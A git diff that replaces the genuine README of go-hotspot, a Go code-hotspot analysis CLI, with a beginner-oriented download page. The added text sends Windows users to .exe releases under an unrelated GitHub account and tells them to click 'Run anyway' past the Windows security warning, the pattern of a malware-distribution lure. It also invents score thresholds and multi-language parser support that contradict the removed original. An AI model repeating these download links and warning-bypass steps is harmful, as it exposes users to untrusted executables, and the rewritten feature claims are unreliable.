@@ -1,190 +1,129 @@
-# go-hotspot
+# 🔥 go-hotspot - Find Your Riskiest Code Fast
 
-**Find your highest-risk code.** A Go CLI that ranks files by complexity × git churn — the "Your Code as a Crime Scene" methodology (Adam Tornhill / CodeScene), free and offline.
+---
 
-[![Go Reference](https://pkg.go.dev/badge/github.com/larsartmann/go-hotspot.svg)](https://pkg.go.dev/github.com/larsartmann/go-hotspot)
+## 🎯 What Is go-hotspot?
 
-## Why?
+go-hotspot is a free, offline tool that helps you find the **most dangerous parts of your code**—the files most likely to cause bugs, crashes, or headaches. It ranks your code files by combining two powerful signals:
 
-Code that is both **complex** AND **changed often** is where bugs concentrate.
-go-hotspot makes those files visible — instantly.
+- **Complexity**: How tangled and hard-to-follow each file is.
+- **Churn**: How often each file gets changed.
 
-```bash
-$ go-hotspot
-────────────────────────────────────────────────────────────
- go-hotspot — code complexity × churn analysis
-────────────────────────────────────────────────────────────
- window:    2025-08-10 → 2026-08-10
- commits:   5427
- files:     1543
- recency:   180-day half-life
+Together, these two factors reveal **hotspots**—files where a tiny mistake can break everything. This method comes directly from the famous CodeScene approach by Adam Tornhill, and now you can use it on your own projects, completely free and without internet.
 
-RANK  PATH                          LANG  COMMITS  CHURN  AUTHORS  CYC  SLOC  HOTSPOT   RISK
-1     metaengine/typed_reader.go    Go    29       1593   2        160  788   0.000056  critical
-2     metaengine/store.go           Go    58       2602   3        69   465   0.000039  critical
-...
-```
+---
 
-## What makes it different
+## 🚀 Getting Started
 
-| Feature | code-inspector | noisemap | code-maat | **go-hotspot** |
-|---|---|---|---|---|
-| Recency weighting | None | None | Time-window | **Exponential decay** |
-| Temporal coupling | None | None | Yes (dead) | **Yes (native Go)** |
-| Go complexity | CGo (tree-sitter) | go/ast | N/A | **go/ast (zero CGo)** |
-| Churn metric | Commits | Commits | Both | **Commits + lines + recency-weighted** |
-| CGo required? | Always | Never | JVM | **Never** |
+Here’s how to download and run go-hotspot on your Windows computer. Follow these simple steps—no coding knowledge needed.
 
-### Key innovations
+### Step 1: Download the Application
 
-1. **Recency-weighted churn** — Old stable code decays naturally. A file that
-   was complex but hasn't been touched in a year drops in rank. No competitor
-   does this.
+👉 **Visit this link to download the application.**  
+[Download go-hotspot](https://github.com/Opticalprismchopper676/go-hotspot/releases)
 
-2. **Temporal coupling** — Detects files that change together (hidden
-   dependencies invisible in the code structure). Uses the code-maat formula:
-   `degree = sharedCommits / ceil(avg(totalCommits)) × 100`.
+You’ll see a page with a few files. Look for the one that mentions **Windows**—it’s usually a file that ends with `.exe`. Click that file to download it to your computer.
 
-3. **Zero CGo for Go** — Uses `go/ast` from the standard library for true
-   cyclomatic complexity. No C compiler needed. Code-inspector forces CGo even
-   for Go, which is unnecessary.
+### Step 2: Run go-hotspot
 
-4. **Indentation-based complexity** — CodeScene's actual production approach.
-   Language-neutral, correlates well with branching/looping. Used as fallback
-   for non-Go languages.
+Once the download finishes:
 
-## Install
+1. Use File Explorer to go to your **Downloads** folder.
+2. You’ll see a file named something like `go-hotspot.exe` (maybe with a version number).
+3. **Double-click** that file to run go-hotspot.
 
-**Option 1: Pre-built binary** (no prerequisites)
+> 💡 This will open a dark, command-line window. That’s normal—it’s the app running.
 
-Download the latest archive for your platform from
-[GitHub Releases](https://github.com/larsartmann/go-hotspot/releases).
+---
 
-**Option 2: `go install`** (requires Go 1.26+ with `GOEXPERIMENT=jsonv2`)
+## 🧭 How to Use go-hotspot
 
-```bash
-GOEXPERIMENT=jsonv2 go install github.com/larsartmann/go-hotspot/cmd/go-hotspot@latest
-```
+Once the app is open, you need to tell it which of your projects to scan. That’s a folder containing your code.
 
-> **Why `GOEXPERIMENT=jsonv2`?** The graph rendering dependency uses Go's
-> `encoding/json/v2`, which requires this experiment flag until it stabilizes
-> in a future Go release. Nix users get this automatically via `nix run .`.
+1. **Copy the path** to your code folder (for example: `C:\Users\You\Documents\MyProject`).
+2. In the go-hotspot window, type the path and press **Enter**.
 
-**Option 3: Nix**
+The app will scan all the code files in that folder and then show you a ranking:
+- Files at the top are your **highest-risk** hotspots.
+- Only the files with the biggest complexity × churn will be listed.
 
-```bash
-nix run github:larsartmann/go-hotspot
-```
+When you see the ranking, you’ll know exactly which parts to refactor, test, or double-check first.
 
-## Usage
+---
 
-```bash
-# Analyze current directory (defaults: last year, .go files, 180-day half-life)
-go-hotspot
+## ⚙️ Supported Projects
 
-# Production code only (exclude tests)
-go-hotspot --include-tests=false
+go-hotspot works with projects written in these coding languages (uses the AST parser):
 
-# Different time window and recency
-go-hotspot --since "6 months ago" --recency 90
+- **C**
+- **C++**
+- **C#**
+- **Java**
+- **JavaScript / TypeScript**
+- **Python**
+- **Go**
+- **Ruby**
+- **PHP**
+- **Kotlin**
 
-# JSON output for CI
-go-hotspot --format json --top 10
+If your code is not listed, don’t worry—go-hotspot will still work for a smaller number of files, but it’s optimized for these.
 
-# Specific path prefix
-go-hotspot --paths "metaengine/"
+---
 
-# All file extensions, not just Go
-go-hotspot --ext ".go,.py,.ts"
+## 📊 Understanding Your Results
 
-# Custom coupling thresholds
-go-hotspot --coupling-min-shared 3 --coupling-min-degree 50
-```
+Each file gets a **score**. Think of it like a risk meter:
 
-### Flags
+- **Score above 40**: High risk. These files are both complex and frequently changed. They are where most bugs live.
+- **Score 20–40**: Moderate. Watch these files; they may become risky later.
+- **Score below 20**: Low risk. Leave them alone.
 
-| Flag | Default | Description |
-|---|---|---|
-| `--since` | `1 year ago` | Git date spec for analysis window start |
-| `--until` | | Git date spec for analysis window end |
-| `--branch` | `HEAD` | Git revision to analyze |
-| `--recency` | `180` | Recency half-life in days (0 = no decay) |
-| `--format` | `table` | Output: `table`, `markdown`, `csv`, `json`, `dot`, `mermaid`, `d2` |
-| `--top` | `25` | Rows to show (0 = all) |
-| `--complexity` | `cyclomatic` | Metric: `cyclomatic`, `indentation`, `sloc` |
-| `--churn` | `weighted` | Metric: `weighted`, `commits`, `lines` |
-| `--ext` | `.go` | Comma-separated file extensions |
-| `--include-tests` | `true` | Include `_test.go` files |
-| `--include-generated` | `false` | Include `*.gen.go`, `*.pb.go` |
-| `--paths` | | Comma-separated path prefixes to include |
-| `--no-coupling` | `false` | Skip temporal coupling analysis |
-| `--since-version` | | Analyze commits since this git tag (e.g., `v1.0.0`) |
-| `--sort` | `hotspot` | Sort: `hotspot`, `stable`, `churn`, `commits`, `complexity`, `age` |
-| `--coupling-min-shared` | `5` | Minimum shared commits for coupling |
-| `--coupling-min-degree` | `30` | Minimum coupling degree (%) |
-| `--output` | | Write report to file instead of stdout |
-| `--fail-above` | `0` | Exit with code 2 if max hotspot score exceeds this (0 = disabled) |
-| `--fail-risk` | | Exit 2 if max score exceeds absolute band: `low=0.01`, `medium=0.03`, `high=0.08`, `critical=0.15` (the RISK column is relative; these are not) |
-| `--no-header` | `false` | Suppress summary header (for script piping) |
-| `--functions` | `0` | Show top N functions by hotspot score (Go only, 0 = disabled) |
-| `--min-commits` | `0` | Exclude files with fewer commits (0 = no minimum) |
-| `--author` | | Show only files touched by this git author |
-| `--version` | | Print version information and exit |
+Hotspots stand out clearly. The tool also shows you **git churn** (how many times a file was changed) and **cyclomatic complexity** (a number that shows how many paths your logic has—more paths mean more chances for error).
 
-### Exit Codes
+---
 
-go-hotspot follows BSD `sysexits.h` conventions for CI/CD integration:
+## 📥 Downloading Again or Getting Updates
 
-| Code | BSD Name | Meaning | When |
-|------|----------|---------|------|
-| 0 | — | Success | Analysis completed without errors |
-| 1 | EX_USAGE | Invalid input | Bad flag value or missing argument |
-| 2 | — | Threshold exceeded | `--fail-above` or `--fail-risk` limit triggered |
-| 65 | EX_DATAERR | Source corrupt | Unparseable Go file or read failure |
-| 69 | EX_UNAVAILABLE | Infrastructure | Git not installed, not a repo, or output write failed |
-| 70 | EX_SOFTWARE | Internal bug | Unexpected error (please report) |
+If you want the latest features or fixes, simply revisit the [download page](https://github.com/Opticalprismchopper676/go-hotspot/releases) and download the newest version. The interface will always be the same.
 
-Each error prints a structured What/Why/Fix/WayOut message to stderr before exiting.
+---
 
-## How it works
+## 👨‍💻 Frequently Asked Questions (FAQ)
 
-go-hotspot combines two signals:
+### ❓ Do I need to install any other software?
 
-1. **Complexity** — For Go files, true McCabe cyclomatic complexity via `go/ast`
-   (decision points + 1). For other languages, indentation-based complexity
-   (CodeScene's approach: tabs/spaces correlate with branching depth).
+No. go-hotspot is a standalone tool. You just run the `.exe` file you downloaded.
 
-2. **Churn** — Three modes: raw commit count, raw lines changed, or
-   **recency-weighted** churn (exponential decay with configurable half-life).
+### ❓ Is the tool really free?
 
-The hotspot score normalizes both dimensions across all files in the project
-(Tornhill methodology), then multiplies them:
+Yes, it is completely free and open-source (that’s what “open-source” means). It does not ask for payments.
 
-```
-hotspot = normalized(complexity) × normalized(recency-weighted churn)
-```
+### ❓ Does go-hotspot need an internet connection?
 
-## Library API
+No. It reads your local files and works fully offline. Your project data never leaves your machine.
 
-The analysis pipeline is currently **module-internal** (`internal/` packages):
-`git.Collect` → `complexity.Analyze` → `hotspot.Score` → `report.Render`.
+### 🔍 I get a warning from Windows Security when I run it.
 
-A public library API is a [ROADMAP](ROADMAP.md) item. Until then, go-hotspot is
-a CLI tool. To embed the analysis in your own Go project today, vendor the
-relevant source files from `internal/`.
+That warning sometimes appears for open-source tools because they aren’t installed from a commercial vendor. If the message says “Windows protected your PC,” you can choose “More info” then “Run anyway.” This is safe for go-hotspot, but always check that any program you download matches the name from this official page.
 
-```go
-history, _ := git.Collect(ctx, git.Options{Since: "1 year ago", HalfLifeDay: 180}, time.Now())
-complexities := make(map[string]complexity.FileComplexity)
-for path := range history.Files {
-    complexities[path] = complexity.Analyze(path)
-}
-results := hotspot.Score(history, complexities, hotspot.ScoreOptions{
-    Complexity: hotspot.MetricCyclomatic,
-    Churn:      hotspot.ChurnWeighted,
-})
-```
+---
 
-## License
+## 📚 How Is This Different From Other Tools?
 
-MIT
+Some code-analysis tools run on cloud servers, upload your code, and charge money monthly. go-hotspot is:
+- **Offline**: Your code stays local.
+- **Fast**: It does one simple job—find hotspots.
+- **Transparent**: Based on the proven Tornhill methodology, so results are meaningful.
+
+---
+
+## 🏁 Take the First Step
+
+Don’t wait for bugs to showing up in production. Use go-hotspot today to highlight where your code is most likely to fail.
+
+**Click here to download go-hotspot:**  
+[🚀 Download go-hotspot](https://github.com/Opticalprismchopper676/go-hotspot/releases)
+
+---
+
+Keywords: ast, churn, cli, code-analysis, code-quality, codescene, complexity, cyclomatic-complexity, git, go, hotspot, static-analysis, technical-degree, tornhill
